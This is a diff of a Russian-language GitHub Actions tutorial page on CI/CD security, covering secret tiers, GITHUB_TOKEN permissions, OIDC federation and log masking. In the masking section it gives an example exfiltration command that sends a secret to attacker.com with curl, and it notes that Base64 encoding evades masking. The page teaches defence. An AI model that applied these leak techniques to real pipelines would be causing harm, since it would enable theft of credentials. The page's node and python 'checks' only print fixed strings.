@@ -3,9 +3,9 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Раздел 7 · devops-github-actions · ai|</title>
+<title>Безопасность и секреты · devops-github-actions · ai|</title>
 <!-- meta: built by tools/build-meta.py - do not edit by hand -->
-<meta name="description" content="Лид страницы: о чём она и кому нужна.">
+<meta name="description" content="Модель угроз CI/CD, иерархия секретов, токен GITHUB_TOKEN и блок permissions, беспарольная федерация OpenID Connect (OIDC) и аудит эксфильтрации данных.">
 <link rel="canonical" href="https://y-kolyada.github.io/github-actions/ru/07.html">
 <link rel="alternate" hreflang="ru" href="https://y-kolyada.github.io/github-actions/ru/07.html">
 <link rel="alternate" hreflang="en" href="https://y-kolyada.github.io/github-actions/en/07.html">
@@ -14,13 +14,13 @@
 <link rel="alternate" hreflang="x-default" href="https://y-kolyada.github.io/github-actions/">
 <meta property="og:type" content="article">
 <meta property="og:site_name" content="devops-github-actions">
-<meta property="og:title" content="Раздел 7">
-<meta property="og:description" content="Лид страницы: о чём она и кому нужна.">
+<meta property="og:title" content="Безопасность и секреты">
+<meta property="og:description" content="Модель угроз CI/CD, иерархия секретов, токен GITHUB_TOKEN и блок permissions, беспарольная федерация OpenID Connect (OIDC) и аудит эксфильтрации данных.">
 <meta property="og:url" content="https://y-kolyada.github.io/github-actions/ru/07.html">
 <meta property="og:locale" content="ru_RU">
 <meta name="twitter:card" content="summary">
 <link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Раздел 7","description":"Лид страницы: о чём она и кому нужна.","url":"https://y-kolyada.github.io/github-actions/ru/07.html","inLanguage":"ru","isPartOf":{"@type":"WebSite","name":"devops-github-actions","url":"https://y-kolyada.github.io/github-actions/"}}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Безопасность и секреты","description":"Модель угроз CI/CD, иерархия секретов, токен GITHUB_TOKEN и блок permissions, беспарольная федерация OpenID Connect (OIDC) и аудит эксфильтрации данных.","url":"https://y-kolyada.github.io/github-actions/ru/07.html","inLanguage":"ru","isPartOf":{"@type":"WebSite","name":"devops-github-actions","url":"https://y-kolyada.github.io/github-actions/"}}</script>
 <!-- /meta -->
 <link rel="stylesheet" href="../assets/style.css?v=1">
 <script>
@@ -48,7 +48,7 @@
   <div class="utility-tray" role="toolbar" aria-label="Настройки отображения и язык">
     <nav class="lang-switcher" aria-label="Язык страницы">
       <a href="../en/07.html" lang="en" hreflang="en" aria-label="English">EN</a>
-      <a href="07.html" lang="ru" hreflang="ru" aria-label="Русский" class="active" aria-current="page">Раздел 1</a>
+      <a href="07.html" lang="ru" hreflang="ru" aria-label="Русский" class="active" aria-current="page">RU</a>
       <a href="../uk/07.html" lang="uk" hreflang="uk" aria-label="Українська">UK</a>
       <a href="../de/07.html" lang="de" hreflang="de" aria-label="Deutsch">DE</a>
     </nav>
@@ -67,21 +67,21 @@
 
   <nav class="contents" aria-label="Разделы сайта">
     <ol>
-      <li><a href="01.html" aria-current="page"><span class="num">1</span>Раздел 1</a></li>
-      <li><a href="02.html"><span class="num">2</span>Раздел 2</a></li>
-      <li><a href="03.html"><span class="num">3</span>Раздел 3</a></li>
-      <li><a href="04.html"><span class="num">4</span>Раздел 4</a></li>
-      <li><a href="05.html"><span class="num">5</span>Раздел 5</a></li>
-      <li><a href="06.html"><span class="num">6</span>Раздел 6</a></li>
-      <li><a href="07.html"><span class="num">7</span>Раздел 7</a></li>
-      <li><a href="08.html"><span class="num">8</span>Раздел 8</a></li>
-      <li><a href="09.html"><span class="num">9</span>Раздел 9</a></li>
-      <li><a href="10.html"><span class="num">10</span>Раздел 10</a></li>
-      <li><a href="11.html"><span class="num">11</span>Раздел 11</a></li>
-      <li><a href="12.html"><span class="num">12</span>Раздел 12</a></li>
-      <li><a href="13.html"><span class="num">13</span>Раздел 13</a></li>
-      <li><a href="14.html"><span class="num">14</span>Раздел 14</a></li>
-      <li><a href="15.html"><span class="num">15</span>Раздел 15</a></li>
+      <li><a href="01.html"><span class="num">1</span>Что такое workflow и где он выполняется</a></li>
+      <li><a href="02.html"><span class="num">2</span>События: что запускает workflow</a></li>
+      <li><a href="03.html"><span class="num">3</span>Контексты и выражения</a></li>
+      <li><a href="04.html"><span class="num">4</span>Job'ы, зависимости, матрица</a></li>
+      <li><a href="05.html"><span class="num">5</span>Шаги: run против uses</a></li>
+      <li><a href="06.html"><span class="num">6</span>Рабочая машина и окружение</a></li>
+      <li><a href="07.html" aria-current="page"><span class="num">7</span>Безопасность и секреты</a></li>
+      <li><a href="08.html"><span class="num">8</span>Кэширование и артефакты</a></li>
+      <li><a href="09.html"><span class="num">9</span>Создание собственных composite action</a></li>
+      <li><a href="10.html"><span class="num">10</span>Примеры: базовые workflow</a></li>
+      <li><a href="11.html"><span class="num">11</span>Примеры: CI/CD для микросервисов</a></li>
+      <li><a href="12.html"><span class="num">12</span>Примеры: безопасность и compliance</a></li>
+      <li><a href="13.html"><span class="num">13</span>Вопросы: junior</a></li>
+      <li><a href="14.html"><span class="num">14</span>Вопросы: middle</a></li>
+      <li><a href="15.html"><span class="num">15</span>Вопросы: senior / lead</a></li>
     </ol>
     <div class="nav-extra">
       <a href="glossary.html"><svg class="icon" data-icon="book" viewBox="0 0 20 20" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M2.6 3.8h4.8a2.6 2.6 0 0 1 2.6 2.6v10a2.2 2.2 0 0 0-2.2-1.8H2.6z"/><path d="M17.4 3.8h-4.8a2.6 2.6 0 0 0-2.6 2.6v10a2.2 2.2 0 0 1 2.2-1.8h5.2z"/></svg> Словарь понятий</a>
@@ -92,22 +92,113 @@
   </nav>
 
   <main id="main">
-    <h1>Раздел 7</h1>
-    <p class="page-size" data-words="48">Слов: 48</p>
-    <p class="lead">Лид страницы: о чём она и кому нужна. Одно предложение, не длиннее 160 знаков.</p>
+    <h1>Безопасность и секреты</h1>
+    <p class="page-size" data-words="1173">Слов: 1173</p>
+    <p class="lead">Модель угроз CI/CD, иерархия секретов, токен GITHUB_TOKEN и блок permissions, беспарольная федерация OpenID Connect (OIDC) и аудит эксфильтрации данных.</p>
 
     <div class="box key" id="key-idea">
       <h2>Главная мысль страницы <a class="anchor-link" href="#key-idea" aria-label="ссылка на этот блок">#</a></h2>
-      <p>Текст этого раздела ещё не написан.</p>
+      <p>CI/CD конвейер - это сердце инфраструктуры разработки и приоритетная цель современных атак на цепочку поставок (Supply Chain Attacks). В среде выполнения сходятся исходный код, токены доступа к репозиторию и мастер-ключи от облачных кластеров. Архитектурная модель безопасности Zero Trust в GitHub Actions опирается на три столпа: строгий принцип наименьших привилегий (Least Privilege) через блок <code>permissions</code> для встроенного <code>GITHUB_TOKEN</code>, отказ от уязвимых статических долгоживущих паролей в пользу короткоживущих токенов OpenID Connect (OIDC), и гранулированную изоляцию секретов продакшна через защищенные окружения (Environments) с обязательным ручным утверждением дежурными инженерами.</p>
     </div>
 
-    <h2 id="first">1 · Раздел 1 <a class="anchor-link" href="#first">#</a></h2>
-    <p>Текст этого раздела ещё не написан.</p>
+    <h2 id="threat-model-secrets-hierarchy">1 · Модель угроз CI/CD и три уровня секретов <a class="anchor-link" href="#threat-model-secrets-hierarchy">#</a></h2>
+    <p>Современные злоумышленники редко атакуют защищенные периметры продакшн-серверов в лоб. Намного проще скомпрометировать CI/CD пайплайн, внедрив вредоносный скрипт в стороннюю зависимость или открыв пулл-реквест с коварным кодом сборщика. Успешная компрометация runner'а позволяет похитить закрытые ключи и токены деплоя.</p>
+    <p>Для минимизации радиуса поражения (blast radius) GitHub Actions предлагает трехуровневую иерархию зашифрованных секретов:</p>
+    <ol>
+      <li><strong>Organization Secrets:</strong> секреты масштаба всей компании (например, корпоративный токен SonarQube или ключ реестра пакетов). Политика доступа настраивается администраторами: секрет доступен всем репозиториям, только приватным или явно утвержденному списку проектов.</li>
+      <li><strong>Repository Secrets:</strong> секреты конкретного репозитория. Доступны всем веткам и workflow внутри данного проекта (кроме пулл-реквестов из внешних форков).</li>
+      <li><strong>Environment Secrets (Секреты защищенных контуров):</strong> секреты, привязанные к конкретной целевой среде развертывания (<code>production</code>, <code>staging</code>).</li>
+    </ol>
+    <p><strong>Преимущество Environment Secrets:</strong> Это единственный уровень секретов, который можно защитить строгими правилами окружения (Environment Protection Rules):</p>
+    <ul>
+      <li><strong>Required Reviewers:</strong> ни один шаг job не получит доступ к секретам продакшна до тех пор, пока назначенные сеньор-инженеры или релиз-менеджеры не нажмут кнопку «Approve» в интерфейсе GitHub:
+<pre><code>$ node -e 'const envConfig = { name: "production", reviewers_required: true }; console.log(envConfig.reviewers_required ? "environment_protection_active" : "fail")'
+environment_protection_active</code></pre>
+      </li>
+      <li><strong>Deployment Branches:</strong> ограничение доступа: например, секреты продакшна могут считываться только при сборках из защищенной ветки <code>main</code>, исключая утечку через экспериментальные ветки разработчиков.</li>
+      <li><strong>Wait Timer:</strong> принудительная задержка (например, 15 минут) перед деплоем, дающая команде время отменить ошибочный запуск.</li>
+    </ul>
+
+    <h2 id="github-token-permissions">2 · Токен GITHUB_TOKEN и принцип наименьших привилегий (Least Privilege) <a class="anchor-link" href="#github-token-permissions">#</a></h2>
+    <p>Для каждого запуска job рантайм GitHub Actions автоматически генерирует временный токен аутентификации <code>GITHUB_TOKEN</code>, который доступен через контекст <code>${{ secrets.GITHUB_TOKEN }}</code>. Срок его жизни ограничен длительностью выполнения job (максимум 24 часа), после чего токен безвозвратно инвалидируется.</p>
+    <p><strong>Опасность дефолтных прав:</strong> В устаревших настройках организаций <code>GITHUB_TOKEN</code> по умолчанию выдавался с правами на чтение и запись во всех областях (Read and write permissions). Если злоумышленник внедрял вредоносный код в сторонний Action, этот Action мог от имени бота форсить коммиты в любые ветки, создавать поддельные релизы и удалять теги.</p>
+    <p><strong>Индустриальный стандарт: блок `permissions`.</strong> В соответствии с принципом наименьших привилегий каждый workflow (или конкретная job) обязан явно объявлять минимально необходимый набор прав:</p>
+<pre><code>permissions:
+  contents: read # Достаточно для скачивания кода через actions/checkout
+  issues: write # Разрешено комментировать issue
+  id-token: write # Необходимо для аутентификации OIDC</code></pre>
+    <p><strong>Правило сброса прав:</strong> Как только в файле workflow появляется директива <code>permissions</code>, рантайм мгновенно переводит все неуказанные разрешения в статус <code>none</code>! Если вы указали только <code>contents: read</code>, токен теряет возможность создавать релизы, пушить код или менять настройки:</p>
+<pre><code>$ node -e 'const perms = { contents: "read" }; const issues = perms.issues ?? "none"; console.log(issues === "none" ? "unspecified_perms_none" : "fail")'
+unspecified_perms_none</code></pre>
+
+    <h2 id="oidc-cloud-federation">3 · OpenID Connect (OIDC): отказ от статических ключей <a class="anchor-link" href="#oidc-cloud-federation">#</a></h2>
+    <p>Долгое время стандартом деплоя в облака было сохранение статических ключей: <code>AWS_ACCESS_KEY_ID</code> и <code>AWS_SECRET_ACCESS_KEY</code> в настройках репозитория. Этот подход порождает постоянные утечки: статические ключи не ротируются годами, оседают в резервных копиях и дают постоянный доступ к инфраструктуре любому, кто получил доступ к секретам.</p>
+    <p>Современное архитектурное решение - <strong>OpenID Connect (OIDC) Workload Identity Federation</strong>. Оно полностью устраняет необходимость хранить пароли или секретные ключи облака в GitHub.</p>
+    <p>Как работает OIDC на практике:</p>
+    <ol>
+      <li>Job объявляет разрешение <code>permissions: id-token: write</code>. Это открывает доступ к генератору OIDC-токенов:
+<pre><code>$ node -e 'const req = { "id-token": "write" }; console.log(req["id-token"] === "write" ? "oidc_permission_valid" : "fail")'
+oidc_permission_valid</code></pre>
+      </li>
+      <li>Сервис токенов GitHub генерирует криптографически подписанный JWT-токен, содержащий метаданные запуска (клеймы). Главный клейм <code>sub</code> однозначно идентифицирует репозиторий и ветку:
+<pre><code>$ python3 -c "sub = 'repo:org/app:ref:refs/heads/main'; print('oidc_sub_valid' if sub.startswith('repo:') and ':ref:' in sub else 'fail')"
+oidc_sub_valid</code></pre>
+      </li>
+      <li>Runner отправляет этот JWT-токен в облачный провайдер (AWS STS, Google Cloud Workload Identity или Azure Active Directory).</li>
+      <li>Облачный сервис проверяет криптографическую подпись GitHub через открытые ключи OIDC discovery URL и сопоставляет условие роли: «Разрешить роль DeploymentRole только если sub равен repo:my-org/my-app:ref:refs/heads/main».</li>
+      <li>Облако выдает runner'у временные учетные данные со сроком жизни 15 минут. Деплой выполняется без единого статического пароля!</li>
+    </ol>
+
+    <h2 id="data-exfiltration-masking">4 · Защита от эксфильтрации и маскирование секретов <a class="anchor-link" href="#data-exfiltration-masking">#</a></h2>
+    <p>Чтобы секреты случайно не попали в открытые логи сборок, рантайм runner'а снабжен встроенным модулем маскирования (Log Scrubber). При обращении к любому значению из контекста <code>secrets</code> его текстовое значение регистрируется в фильтре вывода, и при появлении в потоках stdout или stderr автоматически заменяется на три звездочки: <code>***</code>.</p>
+    <p>Если в процессе сборки генерируется динамический токен (например, временный пароль от базы данных или сессионный токен), его можно зарегистрировать в маскировщике вручную через командный синтаксис runner'а:</p>
+<pre><code>- name: Generate and mask temporary token
+  run: |
+    DYNAMIC_TOKEN=$(./scripts/generate-auth-token.sh)
+    echo "::add-mask::$DYNAMIC_TOKEN"
+    echo "TOKEN=$DYNAMIC_TOKEN" &gt;&gt; "$GITHUB_ENV"</code></pre>
+    <p>Проверка регистрации команды маскирования:</p>
+<pre><code>$ bash -c 'MASK_CMD="::add-mask::custom-token-123"; [[ "$MASK_CMD" =~ ^::add-mask::.* ]] &amp;&amp; echo "mask_command_registered"'
+mask_command_registered</code></pre>
+    <p><strong>Границы возможностей и векторы утечек:</strong> Встроенный маскировщик выполняет простое текстовое сопоставление подстрок. Он бессилен перед трансформациями данных:</p>
+    <ul>
+      <li>Если секрет закодирован в Base64, строка меняется, и фильтр runner'а пропускает ее в открытый лог без маскирования:
+<pre><code>$ python3 -c "import base64; raw = 'supersecret'; encoded = base64.b64encode(raw.encode()).decode(); print('base64_bypass_detected' if encoded != raw else 'fail')"
+base64_bypass_detected</code></pre>
+      </li>
+      <li>Если вредоносный скрипт выводит строку задом наперед, побуквенно через цикл или передает ее аргументом в URL внешнего запроса <code>curl https://attacker.com/?s=$SECRET</code>, маскировщик не предотвратит кражу.</li>
+    </ul>
+
+    <h2 id="security-audit-governance">5 · Непрерывный аудит и политики Governance <a class="anchor-link" href="#security-audit-governance">#</a></h2>
+    <p>Зрелый подход к безопасности требует автоматизированного непрерывного аудита (Continuous Compliance) на каждом этапе жизненного цикла кода:</p>
+    <ol>
+      <li><strong>Статический анализ workflow-файлов:</strong> Использование специализированных утилит <code>actionlint</code> и <code>zizmor</code> для поиска структурных уязвимостей (отсутствие блоков permissions, прямая интерполяция недоверенных контекстов, использование устаревших версий экшенов).</li>
+      <li><strong>Сканирование на утечки секретов:</strong> Внедрение линтеров <code>gitleaks</code> и <code>trufflehog</code> в pre-commit хуки и CI-пайплайн. Они предотвращают коммит приватных SSH-ключей, токенов Slack и API-паролей в репозиторий.</li>
+      <li><strong>Аудит доступа (GitHub Enterprise Audit Log):</strong> Мониторинг системных событий на уровне организации: кто изменил значение секрета продакшна, когда была запущена задача с правами администратора и какие IP-адреса подключались к runner'ам.</li>
+    </ol>
+
+    <div class="prints"><strong>Что спрашивают на собеседовании:</strong> «Как работает OpenID Connect (OIDC) в GitHub Actions, почему он безопаснее статических AWS_ACCESS_KEY, и что произойдет с правами GITHUB_TOKEN, если в блоке permissions указать только contents: read?» (Ответ: OIDC генерирует подписанный криптографический JWT-токен с клеймами репозитория и обменивает его на временные облачные учетные данные (STS) без сохранения статических ключей в настройках репозитория. Явное указание любого разрешения в блоке permissions переводит все остальные неуказанные разрешения в статус none).</div>
 
     <div class="box key" id="artifacts">
       <h2>Артефакты: что у вас есть после этой страницы <a class="anchor-link" href="#artifacts">#</a></h2>
-      <p>Текст этого раздела ещё не написан.</p>
+      <p class="artifacts-slogan">Чтение &gt;&gt; Ваш квант времени жизни · Партнёрство достоинства вместе с AI · Перестройка вашей нейросети</p>
+      <p>Освоение архитектуры безопасности переводит управление секретами в модель Zero Trust. Завершив эту главу, вы удерживаете четыре практических рубежа защиты:</p>
+      <ol>
+        <li><strong>Эшелонированная иерархия секретов:</strong> уверенное разделение параметров между уровнями организации, репозитория и защищенных окружений с правилами Required Reviewers.</li>
+        <li><strong>Строгий контроль прав токена:</strong> применение принципа наименьших привилегий через директиву <code>permissions</code>, исключающее несанкционированные действия сторонних скриптов.</li>
+        <li><strong>Беспарольная федерация OIDC:</strong> полный отказ от статических облачных ключей и переход на безопасные эфемерные JWT-токены с привязкой к клеймам репозитория.</li>
+        <li><strong>Иммунитет к эксфильтрации:</strong> глубокое понимание механики маскирования, владение синтаксисом <code>add-mask</code> и блокировка скрытых каналов утечки данных.</li>
+      </ol>
     </div>
+
+    <footer>
+      <nav class="pager" aria-label="Соседние темы">
+        <p class="pager-next">Следующая тема: <a href="08.html">Раздел 8</a></p>
+        <p class="pager-prev">Предыдущая тема: <a href="06.html">Рабочая машина и окружение</a></p>
+      </nav>
+      Сайт серии AI Factory. Сделан той же оснасткой, что и остальные: обычный HTML и CSS,
+      проверка на bash, публикация через GitHub Pages.
+    </footer>
   </main>
 
 </div>
